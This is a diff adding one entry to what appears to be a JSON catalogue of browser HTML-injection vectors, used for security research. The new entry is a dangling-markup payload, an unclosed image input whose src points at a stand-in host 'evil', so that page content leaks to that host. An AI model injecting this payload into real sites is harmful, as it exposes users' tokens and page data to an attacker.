@@ -251,5 +251,13 @@
             "edge",
             "safari"
         ]
-    }
+    },
+    {
+        "description": "Overwrite type attribute with image in hidden inputs",
+        "code": "<input type=hidden type=image src=\"//evil?",
+        "browsers": [
+            "chrome",
+            "safari"
+        ]
+    }  
 ]
